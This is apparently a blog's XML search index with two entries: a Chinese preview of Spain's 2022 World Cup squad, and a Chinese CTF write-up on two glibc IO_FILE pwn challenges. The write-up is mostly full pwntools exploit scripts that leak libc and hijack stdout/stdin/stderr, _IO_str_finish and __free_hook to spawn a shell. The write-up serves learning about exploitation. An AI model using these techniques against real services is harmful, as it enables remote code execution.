<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>板鸭军团 | 擂鼓吹角亮剑生威 青春风暴剑指卡塔尔</title>
      <link href="/posts/20990.html"/>
      <url>/posts/20990.html</url>
      
        <content type="html"><![CDATA[<h2 id="板鸭军团-擂鼓吹角亮剑生威-青春风暴剑指卡塔尔"><a href="#板鸭军团-擂鼓吹角亮剑生威-青春风暴剑指卡塔尔" class="headerlink" title="板鸭军团 | 擂鼓吹角亮剑生威 青春风暴剑指卡塔尔"></a><strong>板鸭军团 | 擂鼓吹角亮剑生威 青春风暴剑指卡塔尔</strong></h2><p>又到了世界杯年，随着小组赛抽签结束，2022年卡塔尔世界杯的开幕正式进入倒计时。被称为“有史以来争议最多”的一届，它足够令人期待，首次在北半球冬季举行、首次由从未进过世界杯的国家举办、首次在疫情之下进行等等。当然更令球迷们热血沸腾的，还是那一场场激情四射的比赛和火星撞地球般的强强对话。</p><p>夺冠热门之一的西班牙，小组赛就将迎来宿敌德国的考验。08年欧洲杯决赛依靠“金童”托雷斯的一锤定音，他们击败德国站上欧洲之巅，从此一发不可收拾，四年连夺两届欧洲杯、一届世界杯，开创了一个属于传控足球的王朝。如今距他们最后一次夺冠已过去十年之久，这十年间他们经历了王朝覆灭、更新换代，如今恩里克将带领他的弟子们向那昔日的荣耀发起冲击。</p><h2 id="门将篇-争而不足-让则有余"><a href="#门将篇-争而不足-让则有余" class="headerlink" title="门将篇:争而不足 让则有余"></a><strong>门将篇:争而不足 让则有余</strong></h2><p>预测：乌奈·西蒙、德赫亚、罗伯特·桑切斯</p><p>乌奈·西蒙顶替德赫亚出任去年欧洲杯西班牙门将位置上的首发时，引起过不小争议，尽管在淘汰赛有个重大的失误，但并不能遮挡他耀眼的表现。6场比赛全部首发，常规时间内未尝败绩，其中2场零封，3次扑出点球，1次当选全场最佳球员。不出意外的话，本届世界杯西蒙依旧是这个位置上的第一选择。</p><p>德赫亚是曼联本赛季最值得信任的一环，在曼联一塌糊涂的防线身后，是“鸭爸爸”一次又一次地力挽狂澜，好像又回到了2017&#x2F;18赛季德赫亚巅峰的时刻。德赫亚是本赛季场均化解“必入球”最多的英超守门员，平均每90分钟扑出0.41球，领先第二名狼队的若泽·萨的0.38球，而排在第三位的阿尔瓦罗·费尔南德斯只有0.19球。“鸭爸爸”在英超扑救榜上也是以121次高居第二，仅落后第一的梅利耶5次。尽管如此，恩里克依旧倾向于比德赫亚年轻6岁，控制范围更广，在国家队有着更出色表现的西蒙，“门线型”的德赫亚将成为第二选择。</p><p>从本届世界杯预选赛看，第三门将将会从布伦特福德的戴维·拉亚、阿尔瓦罗·费尔南德斯和布莱顿的罗伯特·桑切斯中决出，拉亚和费尔南德斯都是出色的年轻门将，但同属一家俱乐部，出场时间彼此牵制。相对而言，比赛时间更加稳定的桑切斯，则更有希望搭上去往卡塔尔的“末班车”。</p><h2 id="后卫篇：千钧重负-宿将撑场"><a href="#后卫篇：千钧重负-宿将撑场" class="headerlink" title="后卫篇：千钧重负 宿将撑场"></a><strong>后卫篇：千钧重负 宿将撑场</strong></h2><p>预测：阿尔巴、加亚、拉波尔特、保·托雷斯、埃里克·加西亚、伊尼戈·马丁内斯、卡瓦哈尔、阿斯皮利奎塔</p><p>在左后卫的位置上，板鸭军团有着幸福的烦恼，老将阿尔巴依旧是这个位置的不二选择，本赛季有着高达10次的助攻，他的后排插上、边路传中，依旧是巴萨和西班牙进攻最仰仗的武器之一。瓦伦西亚的队长加亚，攻守更加均衡，欧洲杯预选赛、世预赛欧洲区也是多次首发上场，加亚在恩里克的大名单中，还是有着很高的顺位。切尔西的带刀侍卫马科斯·阿隆索，也将极具大名单的竞争力，考虑他与阿尔巴风格相近，前者在国家队的战术地位难以撼动，恩叔启用他的可能相对较小。热刺的雷吉隆、布莱顿的库库雷利亚、莱比锡的安赫利尼奥以及本菲卡的格里马尔多都是边路的进攻的好手，但西班牙在这个位置上太过充裕，这四位小将很难搭上前往卡塔尔的飞机。</p><p>中后卫的位置上，曼城的拉波尔特几乎锁定了一个主力席位，但他的身边无论搭档保·托雷斯还是小将埃里克·加西亚，似乎都不太稳妥。老队长拉莫斯重回国家队的呼声很高，敢于大胆启用年轻人的恩里克不知这次是否会考虑带上这位传奇。从欧洲杯和欧国联比赛看，保·托雷斯和埃里克·加西亚更有可能成为搭档拉波尔特的那个，伊尼戈·马丁内斯、迭戈·略伦特也是世预赛大名单中这个位置的常客。刚加入西班牙国籍的塞维利亚中卫迭戈·卡洛斯和俱乐部状态出色的老将阿尔比奥尔为这个位置提供了更多选择。当然，球迷们还是更期待水爷能保持健康，强势回归。</p><p>右后卫这个位置上的抉择比较容易，健康状态下的卡瓦哈尔将稳坐这个位置的首发，多面手马科斯·略伦特也在“大傻”出现伤病时经常客串这一位置，他将是恩里克手中战术变换的重要武器，但其更有可能出现在中场的位置上。能中能边的切尔西队长阿斯皮利奎塔是这一位置的保障，32岁的他本赛季依旧保持着场均2.05次抢断、2.36次解围和0.82次拦截的高效数据。他的经验和稳定，能为这支年轻的斗牛军团提供很大帮助。在皇马出任卡瓦哈尔替补的巴斯克斯、塞维利亚老队长纳瓦斯和葡萄牙体育的波罗都是这一位置的潜在人选，入围大名单可能性都不大。</p><h2 id="中场篇：攻守均衡-各有千秋"><a href="#中场篇：攻守均衡-各有千秋" class="headerlink" title="中场篇：攻守均衡 各有千秋"></a><strong>中场篇：攻守均衡 各有千秋</strong></h2><p>预测：布斯克茨、罗德里、佩德里、科克、加维、马科斯·略伦特、蒂亚戈、索莱尔</p><p>作为传控足球的开山鼻祖，板鸭军团的中场从来都是最顶级的存在。</p><p>1988年出生的老将布斯克茨是这支球队的节拍器，有着14年国家队经验的他依旧活跃在赛场，作为433阵型中的单后腰，届时布教授将承担起更多串联和防守的任务。被誉为“布斯克茨接班人”的罗德里也将会出现在出征卡塔尔的大名单里，稳坐豪门曼城主力后腰位置的他，不仅出色的完成着他的出球和防守任务，场均2.14次抢断和0.83次拦截均位居英超前列，还贡献了6粒进球，外线的远射和头球能力都值得信赖。皇家社会的年轻中场梅里诺同样发挥出色，但其联赛场均2.06次的抢断、0.58次的拦截和78%的传球成功率和前两位还是有着不小差距，如果布斯克茨和罗德里没有出现伤病，梅里诺将很难出现在卡塔尔的赛场上。</p><p>随着哈维、伊涅斯塔、大卫·席尔瓦、法布雷加斯等西班牙黄金一代的老将逐渐退去，科克、蒂亚戈、伊斯科、萨乌尔中生代显得灵气不足。好在出自拉玛西亚的加维和有着巴萨DNA的佩德里，两个年轻人让人仿佛看到了15年前“哈白”的身影。佩德里更专注于中路，也更能向前发展。通过对比上一年记录的数据，在禁区内加维平均每90分钟触球1.71次，而佩德里的数据是2.31次。同样，加维的2.13个成功的攻击动作(射门、传中和盘带)也落后于佩德里的2.46个。但是当我们看运球时，突然佩德里的 1.97 无法和加维的 2.57相比。进攻中的决斗，加维每 90 分有 10.71 分，而佩德里只有 6.63 分。这意味着加维倾向于回撤更深，而佩德里则是推进到更高的位置，并更多地攻击禁区。对于佩德里和加维的使用，将决定着西班牙的进攻节奏。</p><p>佩德里和加维可能无法同时出现在场上，具有B2B属性的科克很有可能取代其中一个与布斯克茨搭档，届时年满34岁的布教授已缺乏足够的速度，身边需要一个防守属性更强的中场搭档，而铁血马竞的队长完美符合这一条件。他的俱乐部队友马科斯·略伦特也将出现在这份名单当中，除了门将位置都能踢的全能属性，让他成为恩里克手中战术变换重要的一张牌。在利物浦表现出色的蒂亚戈也将很大概率出现在这份名单中，布斯克茨不在场时，蒂亚戈可以很好地分担罗德里的出球压力。对于所有类型的中场，衡量他们好坏的标准就是他们的传球质量，从高阶数据比较来看，蒂亚戈673次传球是唯一在这方面接近布斯克茨735次的。近期与巴萨传出绯闻的巴伦西亚中场卡洛斯·索莱尔也是西班牙在预选赛上的常客，索莱尔是中场万金油，他能适应多个位置，本赛季在蝙蝠军团他能贡献场均1.3次射门、1.6次关键传球、0.63次过人、1.26次铲球、0.97次抢断、1.15次拦截和1.40次解围的全面表现，他在球场上能做到很好的攻防角色转换，如果出现在大名单甚至首发也不必惊讶。</p><p>中场这个位置还有很多的选择，那不勒斯的组织中场法比安·鲁伊斯、西汉姆联的福尔纳尔斯、巴萨的小将尼科·冈萨雷斯以及皇家贝蒂斯核心卡纳莱斯等等，在技术特点同质化的西班牙中场中，特点鲜明的攻击型中场卡纳莱斯算得上“另类”，去年落选欧洲杯让人有些意外，今年的世界杯不知恩叔是否愿意带上这位涅槃重生的昔日天才。</p><h2 id="锋线篇：富边缺中少强点"><a href="#锋线篇：富边缺中少强点" class="headerlink" title="锋线篇：富边缺中少强点"></a><strong>锋线篇：富边缺中少强点</strong></h2><p>预测：费兰·托雷斯、奥尔莫、莫拉塔、萨拉维亚、赫拉德·莫雷诺、安苏·法蒂、耶雷米·皮诺</p><p>如何解决控球与门前效率的兼顾问题，是近些年来困扰西班牙的主要难题，这也将决定着他们大赛可以走多远。他们很多时候可以多点开花，但遇到强队依旧缺乏一个能够一锤定音的球员。莫拉塔是中锋位置上的首选，他出色的策应能力，为队友的穿插、终结提供了很好的掩护，但“双逆足前锋”的终结能力在大赛被屡屡诟病。赫拉德·莫雷诺的出现为这一位置提供了更多选择，看过今年比利亚雷亚尔和利物浦次回合比赛的朋友，相信对这位黄潜的当家球星印象深刻，细腻的脚下技术、出色的传切能力。但这位国家队7号似乎与球队并不兼容，去年欧洲杯上的表现可以用糟糕来形容，期待今年世界杯状态出色的他可以为自己正名。中锋位置上的选择不多，西班牙人武磊的队友德托马斯、塞维利亚高中锋拉法·米尔和本土射手胡安米同样值得关注。</p><p>在边锋边前卫的位置上，这支西班牙也是人才济济。拉玛西亚出身的奥尔莫并不喜欢走寻常路，从克罗地亚和德国顶级联赛踢出来的他，具有更快的节奏，国家队19场比赛打入4球，其中2球都是在90分钟以后绝杀球，关键先生不出意外将坐稳西班牙左路。右路的首选是巴萨的费兰·托雷斯，尽管这位在俱乐部屡屡浪费良机，但是在国家队的费兰·托雷斯依旧值得信赖，23场比赛打入13球，能打边锋也能出任“伪9号”，更是恩里克治下的最佳射手。如果费兰·托雷斯出任“伪9号”，那么右边的位置很有可能是萨拉维亚的，这位去年夏天从大巴黎租界到葡萄牙体育的攻击手，在葡超完美地展现了自己的才华，43场比赛取得18粒进球8次助攻，是当之无愧的最佳射手。在国家队更多以替补出场的他，还是交出了18场7球的高效数据，唯一存在的变数是他将在下赛季回归巴黎圣日耳曼，担任梅西的替补，出场时间将大打折扣。</p><p>如果不受伤，奥亚萨瓦尔也将是恩叔必然带去卡塔尔的人选，本赛季代表皇家社会出场33次，贡献15球4助攻，今年3月左膝前交叉韧带撕裂让他至少缺战6-8个月，能否赶在世界杯前恢复尚未可知。另一位饱受伤病困扰的边锋，便是巴萨的10号接班人法蒂，这位保持着17岁311天的西班牙国家队最年轻进球记录的天才，即将在俱乐部迎来伤愈复出，玻璃人的体质让处于上升期他的一次又一次中断，如果复出后能回到大伤前的效率，恩里克手下这支西班牙必有他的一席之地。不知恩叔这次是否会用满26个名额，上届欧洲杯26个名额只用了24人，没有带去拉莫斯、卡纳莱斯等一众好手让他倍受争议，好在欧洲杯的成绩令人无话可说。如果用满26个名额，比利亚雷亚尔年仅19岁的小将耶雷米·皮诺很有可能搭上“末班车”。今年2月底，他在联赛5-1大胜西班牙人的比赛中打进4球，成为黄潜队史首位西甲大四喜球员，而几周后，他便在与冰岛的友谊赛中为西班牙国家队打进了他的第一个成年国家队进球。出场两次贡献一传一射，小皮诺的风格与西班牙其他传统自由人似的边锋截然不同，敢于启用年轻人的恩里克很有可能将皮诺带去卡塔尔。</p><p>特点鲜明的阿达玛·特拉奥雷也是个“另类”，去年欧洲杯上的尝试并没有带来明显效果，不知道今年恩里克是否还愿意带上他，替补登场冲击一下对手的左边路。近期在皇马表现不错的阿森西奥也是大名单的选择之一，场均进球0.34和每球耗时155分钟的效率让他离出征卡塔尔的距离不算遥远。同样，西班牙的大门还在向罗德里戈、布莱恩·希尔、布赖斯·门德斯、阿韦尔·鲁伊斯等人敞开，但需要他们拿出更亮眼的表现来证明自己。</p><h2 id="总结：拔剑争锋-再试锋芒"><a href="#总结：拔剑争锋-再试锋芒" class="headerlink" title="总结：拔剑争锋 再试锋芒"></a><strong>总结：拔剑争锋 再试锋芒</strong></h2><p>完成新老交替的西班牙队，在去年欧洲杯和欧国联都展现出极强的竞争力，但这支球队依旧存在着薄弱环节，门将位置上球员发挥不稳定，拉波尔特的中后卫搭档相对冒失，中锋位置上缺乏一个“靠谱”的选择。从世界杯抽签来看，即便被分进了“死亡之组”，面对日本，面对哥斯达黎加或者新西兰，都还有绝对实力上的优势，但仍不可掉以轻心。淘汰赛才是对这支年轻的板鸭军团真正的考验，在同时拥有西班牙、德国、比利时、克罗地亚、巴西、葡萄牙、乌拉圭的“死亡半区”里，每一步都是在荆棘中前行。这支年轻的板鸭军团成色如何？倔强的路易斯·恩里克能否证明自己对西班牙传控体系的改造成功？一切悬念，我们卡塔尔揭晓！</p>]]></content>
      
      
      <categories>
          
          <category> 足球 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 足球 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两道IO_FILE题目总结</title>
      <link href="/posts/43930.html"/>
      <url>/posts/43930.html</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow-Incomplete-Menu"><a href="#ctfshow-Incomplete-Menu" class="headerlink" title="ctfshow Incomplete Menu"></a>ctfshow Incomplete Menu</h2><p>wp链接：<a href="https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh?from=from_copylink">https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh?from=from_copylink</a></p><p>这里不再对文件进行详细分析，简单来说就是edit函数里面存在数组越界，可以写入一个字节的 ’\x00‘，但是一个堆块只能编辑一次，总共只能申请5个堆块，但是对于申请堆块的大小不做限制。</p><p>看了大佬给的wp后，思路是先修改_IO_2_1_stdout_来泄露地址，然后修改_IO_2_1_stdin_来实现任意地址写，伪造IO_FILE结构体进行FSOP劫持。</p><p>直接粘贴大佬的wp了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;ctfshow&#x2F;卷王杯&#x2F;Incomplete_Menu&#x2F;pwn&quot;)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;ctfshow&#x2F;卷王杯&#x2F;Incomplete_Menu&#x2F;pwn&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def add(size):    r.sendlineafter(&quot;Please input your choice &gt;&gt; &quot;,&#39;1&#39;)    r.recvuntil(&quot;Please input the size of your heap &gt;&gt; &quot;)    r.sendline(str(size))def edit(index,size,content):    r.sendlineafter(&quot;Please input your choice &gt;&gt; &quot;,&#39;2&#39;)    r.recvuntil(&quot;Please input the index of your heap &gt;&gt; &quot;)    r.sendline(str(index))    r.recvuntil(&quot;Please input the length of content &gt;&gt; &quot;)    r.sendline(str(size))    r.recvuntil(&quot;Please input the content &gt;&gt; &quot;)    r.send(content)def add_x(size):    r.sendline(&#39;1&#39;)    sleep(0.1)    r.sendline(str(size))def edit_x(index,size,content):    r.sendline(&#39;2&#39;)    sleep(0.1)    r.sendline(str(index))    sleep(0.1)    r.sendline(str(size))    sleep(0.1)    r.send(content)def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offset# gdb.attach(r,&quot;b *0x55555555566e&quot;)# pause()add(0x200000)edit(0,0x201000+libc.symbols[&#39;_IO_2_1_stdout_&#39;]+1,&#39;\n&#39;)# pause()add_x(0x200000)# pause()edit_x(1,0x201000*2+libc.symbols[&quot;_IO_2_1_stdout_&quot;]+0x10+1,&#39;\n&#39;)base_addr&#x3D;u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x3ed8b0success(&quot;base_addr&#x3D;&quot;+hex(base_addr))bin_sh_addr&#x3D;base_addr+libc.search(b&#39;&#x2F;bin&#x2F;sh\x00&#39;).__next__()payload&#x3D;p64(0)*5+p64(1)+p64(0)+p64(bin_sh_addr)payload&#x3D;payload.ljust(0xd8,b&#39;\x00&#39;)+p64(base_addr+get_IO_str_jumps()-8)payload +&#x3D; p64(0)+p64(base_addr+libc.symbols[&#39;system&#39;])gdb.attach(r,&quot;b *0x55555555566e\n b exit&quot;)pause()add(0x200000)edit(2,0x201000*3+libc.symbols[&#39;_IO_2_1_stdin_&#39;]+0x38-0x10+1,payload)payload &#x3D; p64(0xfbad208b) # _flagspayload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;] + 132) # _IO_read_ptrpayload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;]) * 6payload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;] + 0x10) # _IO_buf_endpayload &#x3D; payload.ljust(132, b&#39;\x00&#39;) + p64(base_addr - (0x201000 * 3 - 0x10))r.sendlineafter(&quot;&gt;&gt; &quot;, payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想记录的有几点：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大佬定义了这个函数是用来找_IO_str_jumps_在libc中的偏移的，后来从网上找了一下，_好像是说因为_IO_str_jumps不能直接通过libc.symbols[‘_IO_str_jumps’]找到偏移，因此需要自己找一下。调试的时候我发现IO_str_jumps就在IO_file_jumps下面</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220507020934.png"></p><p>先从修改_IO_2_1_stdout_开始，修改_IO_2_1_stdout_用了两次刷零的机会，泄露了libc地址。</p><p>先放上其他大佬总结的泄露地址应满足的条件：</p><ol><li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li><li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li><li>设置<code>_fileno</code>为1。</li><li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li><li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li><li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）。</li></ol><p>第一次将 ‘\x00’ 刷在了_IO_read_end_的末位一字节上，第二次将 ‘\x00’ 刷在了_IO_write_base的末位两字节上。这样就泄露了0xe3个字节的信息，可以泄露出libc基地址。</p><p>泄露完地址后，就利用修改IO_2_1_stdin来实现任意地址写，在修改IO_2_1stdin的IO_buf_base的末位字节为 ‘\x00’ 后，IO_buf_base指向IO_2_1_stdin，调用fgets函数时，就会向IO_2_1_stdin读入数据，由于IO_buf_base与IO_buf_end相差132，因此最多读入132个字节。当读满132个字节后，就会向IO_buf_base中读入数据，由于之前我们伪造了IO_buf_base，因此可以实现任意地址写。这里我们是采用FSOP的方法，劫持exit函数，使其调用IO_str_finsh，并且将flags设置为0，IO_buf_base设置为bin_sh_addr，然后将IO_list_all指向的伪造的IO_FILE_plus结构体+0xe8处放上system_addr，这样在调用IO_str_finsh时会调用system(“&#x2F;bin&#x2F;sh”)。</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/Inked%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220507235348_LI.jpg"></p><p>这里附上大佬总结的exit劫持为IO_str_finsh的调用过程和满足条件：</p><p>所以可以像下面这样构造：</p><ul><li>fp-&gt;_mode &#x3D; 0</li><li>fp-&gt;_IO_write_ptr &#x3D; 0xffffffff</li><li>fp-&gt;_IO_write_base &#x3D; 0</li><li>fp-&gt;_wide_data-&gt;_IO_buf_base &#x3D; bin_sh_addr （也就是 fp-&gt;_IO_write_end）</li><li>fp-&gt;_flags2 &#x3D; 0</li><li>fp-&gt;_mode &#x3D; 0</li></ul><p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_finish</code>。</p><h2 id="2022DASCTF-X-SU-wedding"><a href="#2022DASCTF-X-SU-wedding" class="headerlink" title="2022DASCTF_X_SU wedding"></a>2022DASCTF_X_SU wedding</h2><p>wp：<a href="https://www.cnblogs.com/LynneHuan/p/16070118.html">https://www.cnblogs.com/LynneHuan/p/16070118.html</a></p><p>这篇主要参考了这个大佬的wp进行了复现，<del>（其实就是把大佬的exp抄了一遍）</del>，<del>大佬这道题用了三种方法，我太菜了，只抄了一遍第二种方法</del>。这道题也是主要运用了数组越界的漏洞，首先利用preapare函数修改IO_2_1_stdout的flags和IO_write_base，分别写了一个0x135和0x1314，这样下次就可以泄露大量数据，由于修改了IO_write_base的两个字节，因此每次泄露的数据不固定，大佬找到了一个地址附近同时泄露了elf_base，libc_base和heap_base（这三个基地址后续我们都会用到），但是关闭ASLR时无法泄露大佬找到的那个地址。然后就是我们想要实现任意地址写，由于第二个revise函数给了限制写入次数的条件，因此我们想要先修改掉统计次数的两个变量。我们还有一次preapare的机会，我们利用这次机会修改size[index]的处的值&gt;0x999，这样我们就可以读入8个字节从而一次修改两个变量，然后我们利用revise函数将统计次数的两个变量改为较小的负数，这样我们就获得了多次修改的机会。</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/Inked%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220508002342_LI.jpg"></p><p>我们在修改size[index]的时候申请了一个0x110大小的堆块，我们利用现在多次编辑的函数，在上面写入0x2000用于作为下一次判断size[index]的大小的位置，这样我们下次我们就可以写入8个字节而不是3个字节。之后我们计算好偏移，申请适量的堆块，使得最后一次申请到的地址刚好满足在heap[index]处。而申请的堆块超过7个后，每次申请的堆块都会在0处，这样我们就实现了任意地址写的机会。大佬的思路是劫持puts函数调用_IO_str_finish，下面是大佬劫持的思路：</p><ul><li>继续使用跳板，将<code>stderr-&gt;vtable</code>修改为<code>_IO_str_jumps</code>；将<code>_IO_2_1_stderr_+131</code>处修改为<code>sh;</code>；将<code>__free_hook</code>修改为<code>system</code>；将<code>stderr-&gt;flags</code>修改为<code>0x80</code>；最后把<code>bss</code>段上的<code>stdout</code>修改为<code>_IO_2_1_stderr_</code>。接着，在调用<code>puts(xxx)</code>的时候，会调用<code>stderr-&gt;vtable-&gt;_IO_file_xsput</code>，实际调用的是<code>_IO_str_finish</code>，接着调用<code>free(fp-&gt;_IO_buf_base)</code>，就是调用<code>system(&quot;sh;&quot;)</code></li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;2022DASCTF_X_SU&#x2F;wedding_room&#x2F;wedding_room&quot;)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;2022DASCTF_X_SU&#x2F;wedding_room&#x2F;wedding_room&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.31-0ubuntu9.7_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offsetdef add(size, length&#x3D;None):    r.sendlineafter(&quot;&gt;&gt; \n&quot;, &#39;1&#39;)    if size &gt; 0x7fffffff:        size -&#x3D; (0x1 &lt;&lt; 32)    r.sendafter(&quot;&gt;&gt; \n&quot;, str(size).ljust(8,&#39;\x00&#39;))    if length is not None:        r.sendafter(&quot;&gt;&gt; \n&quot;, str(length).ljust(8,&#39;\x00&#39;))    def edit(index, content&#x3D;None):    r.sendlineafter(&quot;your choice &gt;&gt; \n&quot;, &#39;2&#39;)    r.sendlineafter(&quot;which packet you want to revise&gt;&gt; \n&quot;, str(index))    r.sendafter(&quot;now write your wish&gt;&gt; \n&quot;, content)def dbg():    gdb.attach(r,&quot;b *$rebase(0x162A)\n b *$rebase(0x15BD)&quot;)    pause()off_first &#x3D; 0x42ff0# dbg()add(0x40000,off_first + libc.symbols[&#39;_IO_2_1_stdout_&#39;]+1)add(0x40000, off_first + 0x83ff0 - 0x42ff0 + libc.sym[&#39;_IO_2_1_stdout_&#39;] + 0x20)r.recvuntil(p64(0xfffffffffffffff8), timeout&#x3D;5)m1 &#x3D; r.recv(0x10)r.recvuntil(p64(0xffffffffffffff78), timeout&#x3D;5)m2 &#x3D; r.recv(0x2d8)elf_base&#x3D;u64(m1[:8])-0x4040libc_base&#x3D;u64(m1[8:0x10])-0x1f1530heap_base&#x3D;u64(m2[-8:])success(&quot;elf_base &#x3D; &quot;+hex(elf_base))success(&quot;libc_base &#x3D; &quot;+hex(libc_base))success(&quot;heap_base &#x3D; &quot;+hex(heap_base))free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]IO_2_1_stderr&#x3D;libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;]IO_str_jumps&#x3D;libc_base+get_IO_str_jumps()edit(-19,p64(elf_base+0x4050)[:3])dbg()target_addr &#x3D; elf_base + 0x4015heap_addr &#x3D; heap_base + 0x2a0success(&quot;d &#x3D; &quot;+hex(target_addr-heap_addr))assert len(str(target_addr-heap_addr)) &lt;&#x3D; 8, &quot;try again&quot;add(0x100, target_addr-heap_addr)# dbg()edit(-19, p32(0xff000000)*2) edit(2,p16(0x2000))#通过申请适量的堆块，使得可以写入想要修改的地址，通过size的验证。size_addr&#x3D;elf_base+0x4060elf_heap_addr&#x3D;elf_base+0x40a0size_index&#x3D;(heap_addr-size_addr)&#x2F;&#x2F;4over_read_addr&#x3D;(8*size_index)+elf_heap_addrtop_chunk&#x3D;heap_base+0x3a0distance&#x3D;over_read_addr-top_chunk-0x10success(&quot;distance &#x3D; &quot;+hex(distance))count&#x3D;2malloc_size&#x3D;0x10010while True:    times,heap_size&#x3D;divmod(distance,malloc_size)    if heap_size&#x3D;&#x3D;0 or heap_size&gt;&#x3D;0x20:        break    else:        malloc_size -&#x3D; 0x10for i in range(times):    add(malloc_size-0x10)    count+&#x3D;1if heap_size:    add(heap_size-0x10)    count+&#x3D;1add(0x1000) #target_heapcount+&#x3D;1if count&gt;7:    count&#x3D;0# pause()# dbg()edit(count,p64(free_hook))edit(size_index,p64(system_addr))edit(count,p64(IO_2_1_stderr+216))edit(size_index,p64(IO_str_jumps-0x28))edit(count,p64(IO_2_1_stderr+131))edit(size_index,&#39;sh;&#39;)edit(count,p64(IO_2_1_stderr))edit(size_index,p8(0x80))edit(count,p64(elf_base+0x4020))edit(size_index,p64(IO_2_1_stderr))r.interactive()<span aria-hidden="true" 